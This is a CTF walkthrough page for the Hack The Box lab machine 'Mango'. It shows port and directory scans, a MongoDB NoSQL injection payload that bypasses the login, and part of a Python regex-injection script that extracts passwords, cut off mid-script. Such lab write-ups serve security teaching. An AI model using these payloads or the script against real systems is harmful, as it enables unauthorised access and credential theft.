@@ -1,0 +1,537 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Grab a bite!">
+    <meta name="author" content="Sabe Barker">
+
+    <title>Mango - Hack The Box · Sabe Barker</title>
+
+    <link rel="canonical" href="https://sabebarker.com/writeups/hackthebox/machines/mango/">
+
+    <!-- Bootstrap core CSS -->
+    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
+	<!-- Custom CSS -->
+    <link href="/assets/css/sabe.css" rel="stylesheet">
+    <!-- Lightbox -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" rel="stylesheet">
+    <!-- Favicons -->
+	<link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
+	<link rel="icon" href="/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+	<link rel="icon" href="/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+	<link rel="manifest" href="/assets/img/favicons/manifest.json">
+	<link rel="mask-icon" href="/assets/img/favicons/safari-pinned-tab.svg" color="#8248f6">
+	<link rel="icon" href="/assets/img/favicons/favicon.ico">
+	<meta name="apple-mobile-web-app-title" content="Sabe Barker">
+	<meta name="application-name" content="Sabe Barker">
+	<meta name="msapplication-TileColor" content="#fff">
+	<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
+	<meta name="theme-color" content="#fff">
+	
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@sabebarker">
+    <meta name="twitter:creator" content="@sabebarker">
+    <meta name="twitter:title" content="Mango - Hack The Box · Sabe Barker">
+    <meta name="twitter:description" content="Grab a bite!">
+    <meta name="twitter:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/mango/mango_infocard.png">
+
+    <!-- Facebook -->
+    <meta property="og:url" content="https://sabebarker.com/writeups/hackthebox/machines/mango/" />
+    <meta property="og:title" content="Mango - Hack The Box · Sabe Barker">
+    <meta property="og:description" content="Grab a bite!">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/mango/mango_infocard.png">
+    <meta property="og:image:secure_url" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/mango/mango_infocard.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151243373-1"></script>
+	<script>
+  		window.dataLayer = window.dataLayer || [];
+  		function gtag(){dataLayer.push(arguments);}
+  		gtag('js', new Date());
+
+  		gtag('config', 'UA-151243373-1');
+	</script>
+  </head>
+  <body>
+    <a class="skippy sr-only sr-only-focusable" href="#content">
+      <span class="skippy-text">Skip to main content</span>
+    </a>
+
+    <header class="navbar navbar-expand navbar-light flex-column flex-md-row sb-navbar">
+      <a class="navbar-brand mr-0 mr-md-2" href="/" aria-label="Sabe Barker"><svg id="Layer_35" enable-background="new 0 0 64 64" height="36" viewBox="0 0 64 64" width="36" class="d-inline-block align-top" style="margin-right: 10px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="32" x2="32" y1="63" y2="1"><stop offset="0" stop-color="#9f2fff"/><stop offset="1" stop-color="#0bb1d3"/></linearGradient><path d="m42.363 39.397 1.596 1.205c-.446.59-.85 1.22-1.202 1.872l-1.761-.949c.4-.742.86-1.458 1.367-2.128zm.887-1.079 1.5 1.322c1.863-2.112 3.182-4.677 3.814-7.416l-1.949-.45c-.557 2.417-1.721 4.68-3.365 6.544zm-4.689-23.805.878-1.797c-2.33-1.139-4.833-1.716-7.439-1.716s-5.109.577-7.439 1.716l.878 1.797c4.108-2.008 9.014-2.008 13.122 0zm14.439 13.487v.396c0 5.149-1.884 10.104-5.304 13.952-1.738 1.956-2.696 4.473-2.696 7.09v.562c0 3.859-3.14 7-7 7h-12c-3.86 0-7-3.141-7-7v-.562c0-2.616-.958-5.134-2.696-7.09-3.42-3.848-5.304-8.803-5.304-13.952v-.396c0-11.58 9.42-21 21-21s21 9.42 21 21zm-2 0c0-10.477-8.523-19-19-19s-19 8.523-19 19v.396c0 4.659 1.705 9.142 4.799 12.624 2.064 2.321 3.201 5.311 3.201 8.418v.562c0 2.757 2.243 5 5 5h12c2.757 0 5-2.243 5-5v-.562c0-3.106 1.137-6.097 3.201-8.418 3.094-3.482 4.799-7.965 4.799-12.624zm-10 18v4c0 1.654-1.346 3-3 3h-12c-1.654 0-3-1.346-3-3v-4c0-1.654 1.346-3 3-3h12c1.654 0 3 1.346 3 3zm-3-1h-1v2h2v-1c0-.552-.449-1-1-1zm-9 4v2h2v-2zm2-2v-2h-2v2zm2 4h2v-2h-2zm2-4v-2h-2v2zm-10-1v1h2v-2h-1c-.551 0-1 .448-1 1zm1 5h1v-2h-2v1c0 .552.449 1 1 1zm13-1v-1h-2v2h1c.551 0 1-.448 1-1zm-8.618-19h3.236l2.105 4.211c.181.361.277.767.277 1.171 0 1.443-1.174 2.618-2.618 2.618h-2.764c-1.444 0-2.618-1.175-2.618-2.618 0-.404.096-.81.276-1.171zm1.236 2-1.553 3.105c-.043.085-.065.181-.065.277 0 .341.277.618.618.618h2.764c.341 0 .618-.277.618-.618 0-.096-.022-.191-.065-.276l-1.553-3.106zm14.089-16.293-1.218 1.218c2.149 1.225 3.511 3.509 3.511 6.075 0 3.86-3.14 7-7 7-3.067 0-5.987-1.962-6.943-4.667l-.21-.595 10.446-10.446zm-2.708 2.709-6.809 6.809c.862 1.616 2.821 2.775 4.81 2.775 2.757 0 5-2.243 5-5 0-1.989-1.209-3.798-3.001-4.584zm-19.999 11.584c-3.86 0-7-3.14-7-7 0-2.567 1.362-4.851 3.511-6.075l-1.218-1.218 1.414-1.414 10.446 10.446-.21.595c-.956 2.704-3.876 4.666-6.943 4.666zm0-2c1.989 0 3.948-1.159 4.811-2.775l-6.809-6.809c-1.793.786-3.002 2.595-3.002 4.584 0 2.757 2.243 5 5 5zm-14.098-17.676 1.49 1.334c5.498-6.138 13.374-9.658 21.608-9.658v-2c-8.802 0-17.221 3.763-23.098 10.324zm23.098 49.676v2c9.308 0 18.04-4.128 23.958-11.325l-1.545-1.27c-5.537 6.734-13.706 10.595-22.413 10.595zm-28.969-27.649c.032.688.088 1.383.168 2.062l1.986-.232c-.074-.634-.127-1.28-.156-1.922zm4.132 9.256c-.252-.592-.486-1.196-.693-1.799l-1.891.652c.223.646.474 1.297.745 1.932zm-1.256-3.643c-.164-.615-.309-1.247-.429-1.879l-1.965.375c.129.679.285 1.358.461 2.02zm52.186-13.928c.165.617.309 1.249.429 1.879l1.965-.375c-.129-.677-.284-1.356-.461-2.02zm2.876 5.613c-.032-.689-.088-1.383-.168-2.063l-1.986.233c.074.633.127 1.28.156 1.922zm-4.132-9.256c.252.589.485 1.194.694 1.798l1.891-.652c-.224-.65-.475-1.3-.746-1.932zm6.163 21.607c0 1.654-1.346 3-3 3-.117 0-.228-.021-.342-.035-.628 1.241-1.323 2.455-2.112 3.602l-1.647-1.135c.733-1.063 1.377-2.189 1.96-3.338-.53-.541-.859-1.279-.859-2.094 0-1.654 1.346-3 3-3s3 1.346 3 3zm-2 0c0-.552-.449-1-1-1s-1 .448-1 1 .449 1 1 1 1-.448 1-1zm-52.199-28.404c-1.014 1.35-1.904 2.795-2.668 4.299.535.542.867 1.285.867 2.105 0 1.654-1.346 3-3 3s-3-1.346-3-3 1.346-3 3-3c.112 0 .219.021.328.033.821-1.623 1.779-3.183 2.874-4.639zm-3.801 6.404c0-.551-.449-1-1-1s-1 .449-1 1 .449 1 1 1 1-.449 1-1z" fill="url(#SVGID_1_)"/></svg>{ sabebarker }
+      </a>
+
+      <div class="navbar-nav-scroll">
+        <ul class="navbar-nav sb-navbar-nav flex-row">
+          <li class="nav-item">
+            <a class="nav-link " href="/search">
+        <svg height="15" class="octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search" viewBox="0 0 16 16" version="1.1" width="15" aria-hidden="true"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0013 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 000-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"/></svg>
+      </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/">
+	      Home
+	     </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/blog">
+	      Blog
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link active" href="/writeups">
+	      Writeups
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/tools">
+	      Tools
+	    </a>
+          </li>
+        </ul>
+      </div>
+
+      <ul class="navbar-nav flex-row ml-md-auto d-none d-md-flex">
+        <li class="nav-item">
+          <a class="nav-link p-2" href="https://github.com/sabebarker" target="_blank" rel="noopener" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 499.36" role="img" focusable="false"><title>GitHub</title><path fill="currentColor" fill-rule="evenodd" d="M256 0C114.64 0 0 114.61 0 256c0 113.09 73.34 209 175.08 242.9 12.8 2.35 17.47-5.56 17.47-12.34 0-6.08-.22-22.18-.35-43.54-71.2 15.49-86.2-34.34-86.2-34.34-11.64-29.57-28.42-37.45-28.42-37.45-23.27-15.84 1.73-15.55 1.73-15.55 25.69 1.81 39.21 26.38 39.21 26.38 22.84 39.12 59.92 27.82 74.5 21.27 2.33-16.54 8.94-27.82 16.25-34.22-56.84-6.43-116.6-28.43-116.6-126.49 0-27.95 10-50.8 26.35-68.69-2.63-6.48-11.42-32.5 2.51-67.75 0 0 21.49-6.88 70.4 26.24a242.65 242.65 0 0 1 128.18 0c48.87-33.13 70.33-26.24 70.33-26.24 14 35.25 5.18 61.27 2.55 67.75 16.41 17.9 26.31 40.75 26.31 68.69 0 98.35-59.85 120-116.88 126.32 9.19 7.9 17.38 23.53 17.38 47.41 0 34.22-.31 61.83-.31 70.23 0 6.85 4.61 14.81 17.6 12.31C438.72 464.97 512 369.08 512 256.02 512 114.62 397.37 0 256 0z"/></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://twitter.com/sabebarker" target="_blank" rel="noopener" aria-label="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 416.32" role="img" focusable="false"><title>Twitter</title><path fill="currentColor" d="M160.83 416.32c193.2 0 298.92-160.22 298.92-298.92 0-4.51 0-9-.2-13.52A214 214 0 0 0 512 49.38a212.93 212.93 0 0 1-60.44 16.6 105.7 105.7 0 0 0 46.3-58.19 209 209 0 0 1-66.79 25.37 105.09 105.09 0 0 0-181.73 71.91 116.12 116.12 0 0 0 2.66 24c-87.28-4.3-164.73-46.3-216.56-109.82A105.48 105.48 0 0 0 68 159.6a106.27 106.27 0 0 1-47.53-13.11v1.43a105.28 105.28 0 0 0 84.21 103.06 105.67 105.67 0 0 1-47.33 1.84 105.06 105.06 0 0 0 98.14 72.94A210.72 210.72 0 0 1 25 370.84a202.17 202.17 0 0 1-25-1.43 298.85 298.85 0 0 0 160.83 46.92"/></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://facebook.com/sabebarker2600" target="_blank" rel="noopener" aria-label="Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 24 24" role="img" focusable="false"><title>Facebook</title><path fill="currentColor" d="M210.787 234.832l68.31-22.883 22.1 65.977-68.309 22.882z"/><path fill="currentColor" d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg></a>
+       </li>
+      </ul>
+    </header>
+
+
+    <div class="container-fluid">
+      <div class="row flex-xl-nowrap">
+        <div class="col-12 col-md-3 col-xl-2 sb-sidebar">
+          <button class="btn btn-link sb-search-docs-toggle d-md-none p-0 ml-3" type="button" data-toggle="collapse" data-target="#sb-docs-nav" aria-controls="sb-docs-nav" aria-expanded="false" aria-label="Toggle docs navigation"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 30 30" role="img" focusable="false"><title>Menu</title><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"/></svg></button>
+
+<nav class="collapse sb-links" id="sb-docs-nav"><div class="sb-toc-item">
+      <a class="sb-toc-link" href="/writeups/hackthebox/getting-started/introduction/">
+        Getting Started
+      </a>
+
+      <ul class="nav sb-sidenav"><li>
+            <a href="/writeups/hackthebox/getting-started/introduction/">
+              Introduction
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/getting-started/basic-setup/">
+              Basic Setup
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/getting-started/vpn-setup/">
+              VPN Setup
+            </a>
+          </li></ul>
+    </div><div class="sb-toc-item active">
+      <a class="sb-toc-link" href="/writeups/hackthebox/machines/nest/">
+        Machines
+      </a>
+
+      <ul class="nav sb-sidenav"><li>
+            <a href="/writeups/hackthebox/machines/nest/">
+              Nest
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/resolute/">
+              Resolute
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/obscurity/">
+              Obscurity
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/openadmin/">
+              OpenAdmin
+            </a>
+          </li><li class="active sb-sidenav-active">
+            <a href="/writeups/hackthebox/machines/mango/">
+              Mango
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/traverxec/">
+              Traverxec
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/forest/">
+              Forest
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/postman/">
+              Postman
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/scavenger/">
+              Scavenger
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/json/">
+              Json
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/ai/">
+              AI
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/bitlab/">
+              Bitlab
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/craft/">
+              Craft
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/networked/">
+              Networked
+            </a>
+          </li></ul>
+    </div></nav>
+        </div>
+
+        
+          <div class="d-none d-xl-block col-xl-2 sb-toc">
+            <ul class="section-nav">
+<li class="toc-entry toc-h2"><a href="#enumeration">Enumeration</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#portscan">Portscan</a></li>
+<li class="toc-entry toc-h3"><a href="#domains">Domains</a></li>
+<li class="toc-entry toc-h3"><a href="#directory-brutforce">Directory Brutforce</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#user">User</a></li>
+<li class="toc-entry toc-h2"><a href="#root">Root</a></li>
+<li class="toc-entry toc-h2"><a href="#conclusion">Conclusion</a></li>
+</ul>
+          </div>
+        
+
+        <main class="col-12 col-md-9 col-xl-8 py-md-3 pl-md-5 sb-content" role="main">
+          <h1 class="sb-title" id="content">Mango</h1>
+          <p class="sb-lead">Grab a bite!</p>
+          <p class="text-center"><img src="/assets/img/writeups/hackthebox/machines/mango/mango_infocard.png" alt="HackTheBox Mango Machine Info Card" class="img-fluid" /></p>
+
+<p><strong>Mango</strong> is a medium difficulty machine running Linux that tests your knowledge in <em>OSINT, Mongo DB exploitation and privilege escalation through a GTFOBin</em>. This is one of those machines that gives a pretty good hint in it’s name.</p>
+
+<p>Be sure to checkout the <a href="/writeups/hackthebox/getting-started/basic-setup/">Basic Setup</a> section  before you get started.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Like always, enumeration is our first port of call. Let’s take a look at the machine and see what we are dealing with.</p>
+
+<h3 id="portscan">Portscan</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">portscan mango.htb
+Grabbing ports...
+Ports grabbed!
+Scanning...
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-10-27 21:31 GMT
+Nmap scan report <span class="k">for </span>10-10-10-162.tpgi.com.au <span class="o">(</span>10.10.10.162<span class="o">)</span>
+Host is up <span class="o">(</span>0.39s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: 403 Forbidden
+443/tcp open  ssl/http Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Mango | Search Base
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging-order.mango.htb/organizationName<span class="o">=</span>Mango Prv Ltd./stateOrProvinceName<span class="o">=</span>None/countryName<span class="o">=</span>IN
+| Not valid before: 2019-09-27T14:21:19
+|_Not valid after:  2020-09-26T14:21:19
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn: 
+|_  http/1.1
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>50.98 seconds</code></pre></figure>
+
+<p>Straight off the mark we see that we have port <code class="highlighter-rouge">80</code> and <code class="highlighter-rouge">443</code> open. However, port <code class="highlighter-rouge">80</code> returns <em>403 Forbidden</em> but we see that port <code class="highlighter-rouge">443</code> returns the <em>http</em> title <code class="highlighter-rouge">Mango | Search Base</code> which tells us there is an accessible website.</p>
+
+<p>Another thing we notice is the <em>SSL</em> certificate for the <em>VHost</em> domain <code class="highlighter-rouge">staging-order.mango.htb</code>. Let’s add this domain to our <code class="highlighter-rouge">/etc/hosts</code> along with <code class="highlighter-rouge">mango.htb</code> and then go check them out.</p>
+
+<h3 id="domains">Domains</h3>
+
+<p>Going to <code class="highlighter-rouge">https://mango.htb</code> as expected we are presented with the <em>SSL</em> warning. Our gut instinct here is that the intended domain is <code class="highlighter-rouge">staging-order.mango.htb</code>. But let’s continue on anyway by clicking <code class="highlighter-rouge">Advanced</code> and then <code class="highlighter-rouge">Accept the Risk and Continue</code>.</p>
+
+<p>We see the following site mimicking <em>Google</em> search:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/mango/mango.htb.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/mango/mango.htb.png" alt="Mango Main Screenshot" class="img-fluid" /></a></p>
+
+<p>If we try and search we get <code class="highlighter-rouge">0 results found</code>.</p>
+
+<p>Taking a look at the source of the site we see that it is a static site that always show no results. Within the source we also see that the logo is being hosted via the github repository <code class="highlighter-rouge">https://github.com/MangoDevelopers</code>. This maybe useful later so we will just keep that in mind.</p>
+
+<p>At the top right menu we see a bunch of dead links except for the <code class="highlighter-rouge">Analytics</code> which naviagtes to <code class="highlighter-rouge">analytics.php</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/mango/mango.htb_analytics.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/mango/mango.htb_analytics.png" alt="Mango Analytics Screenshot" class="img-fluid" /></a></p>
+
+<p>We see some errors which show a link that takes us to <code class="highlighter-rouge">https://www.flexmonster.com</code>. Quickly we see that this is a <code class="highlighter-rouge">web client-side JavaScript component</code>. Most likely of no use to us so let’s just take note and go checkout our other domain.</p>
+
+<p>On navigating to <code class="highlighter-rouge">https://staging-order.mango.htb</code> we see the following:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/mango/staging-order.mango.htb.jpg" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/mango/staging-order.mango.htb.jpg" alt="Mango Staging Screenshot" class="img-fluid" /></a></p>
+
+<p>Now this is looking more like it. Trying a few common default passwords yields nothing. Let’s look for some interesting directories that may help us.</p>
+
+<h3 id="directory-brutforce">Directory Brutforce</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://staging-order.mango.htb <span class="nt">-t</span> 10 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt 
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://staging-order.mango.htb
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2019/11/25 23:16:40 Starting gobuster
+<span class="o">===============================================================</span>
+/vendor <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">===============================================================</span>
+2019/11/25 23:19:09 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>We find the <code class="highlighter-rouge">vendor</code> directory. Let’s check that too:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://staging-order.mango.htb/vendor <span class="nt">-t</span> 10 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt 
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://staging-order.mango.htb/vendor
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2019/11/25 23:24:57 Starting gobuster
+<span class="o">===============================================================</span>
+/composer <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">===============================================================</span>
+2019/11/25 23:27:28 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>We recognize this folder as the tool <em>Composer</em> a Dependency Manager for PHP.</p>
+
+<p>Being familiar with this tool we know that there should be a file called <code class="highlighter-rouge">installed.json</code> which will show us what dependencies are installed:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/mango/staging-order.mango.htb_installed-json.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/mango/staging-order.mango.htb_installed-json.png" alt="Mango Installed.json Screenshot" class="img-fluid" /></a></p>
+
+<p>We see that the tool <em>Mongo PHP Adapter</em> is installed. This tells us that we have <em>Mongo Database</em> in the backend which in combination with a <em>PHP MongoDB driver</em> can be susceptible to <em>NO-SQL injection</em> similar to that of <em>SQL</em>. Looks like we may have potentially found our weak point.</p>
+
+<h2 id="user">User</h2>
+
+<p>Now <em>Mongo</em> injection is not the same as <em>SQL</em>. Instead of dealing with string parameters we are dealing with objects so the usual <code class="highlighter-rouge">?username=admin&amp;password=" OR 1 --</code> trick won’t work.</p>
+
+<p>However, by passing objects through the PHP MongoDB driver we can accomplish the same with <code class="highlighter-rouge">?username=admin&amp;passwd[$ne]=1</code>.</p>
+
+<p>Since we also do not know the username we will use <code class="highlighter-rouge">username[$ne]=&amp;password[$ne]=&amp;login=login</code> and will be doing so in a <code class="highlighter-rouge">POST</code> request.</p>
+
+<p>Loading up <em>Burp Suite</em> we make our way to the <code class="highlighter-rouge">Proxy</code> tab where we ensure <code class="highlighter-rouge">Intercept is on</code> and our browser is set to use the <em>Burpsuite</em> proxy.</p>
+
+<p>Once setup we will click the <code class="highlighter-rouge">Login</code> button on our page. We should now see the following in <em>Burps</em> proxy tab:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/mango/staging-order.mango.htb_burp-proxy.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/mango/staging-order.mango.htb_burp-proxy.png" alt="Mango Burp Proxy Screenshot" class="img-fluid" /></a></p>
+
+<p>Now we replace <code class="highlighter-rouge">username=&amp;password=&amp;login=login</code> with <code class="highlighter-rouge">username[$ne]=&amp;password[$ne]=&amp;login=login</code> and click <code class="highlighter-rouge">Forward</code>.</p>
+
+<p>Lo and behold we are logged in and presented with an <code class="highlighter-rouge">Under Contruction</code> page:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/mango/staging-order.mango.htb_login-home.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/mango/staging-order.mango.htb_login-home.png" alt="Mango Under Construction Screenshot" class="img-fluid" /></a></p>
+
+<p>Nothing overly interesting but we do find the email <code class="highlighter-rouge">admin@mango.htb</code> which we will take note of.</p>
+
+<p>Even though we haven’t gained access to anything mangoliciously “juicy” we do now know that we have an exploitation to take advantage of.</p>
+
+<p>Let’s see if we can extract some usernames and passwords.</p>
+
+<p>Doing some research we find a handy <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection">page</a> that explains how to extract the length of usernames and passwords as well as using <em>Regex</em> to enumerate the characters.</p>
+
+<p>At a closer look we also see a script and one line jumps out at us: <code class="highlighter-rouge">params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}</code></p>
+
+<p>A bit below that we see the request is being sent as a <code class="highlighter-rouge">POST</code> request. This looks very similar to how we accessed the construction page with <em>Burp</em>.</p>
+
+<p>Taking a look at the rest of the code in the script we can establish that this maybe exactly what we were looking for.</p>
+
+<p>We will copy the following code into a file called <code class="highlighter-rouge">post-brute.py</code> and add the following:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://staging-order.mango.htb"</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Host"</span><span class="p">:</span> <span class="s">"staging-order.mango.htb"</span><span class="p">}</span>
+<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"PHPSESSID"</span><span class="p">:</span> <span class="s">"s3gcsgtqre05bah2vt6tibq8lsdfk"</span><span class="p">}</span>
+<span class="n">possible_chars</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">)</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="o">+</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">punctuation</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">whitespace</span> <span class="p">]</span>
+<span class="k">def</span> <span class="nf">get_password</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Extracting password of "</span><span class="o">+</span><span class="n">username</span><span class="p">)</span>
+    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span> <span class="s">"password[$regex]"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span> <span class="s">"login"</span><span class="p">:</span> <span class="s">"login"</span><span class="p">}</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="s">"^"</span>
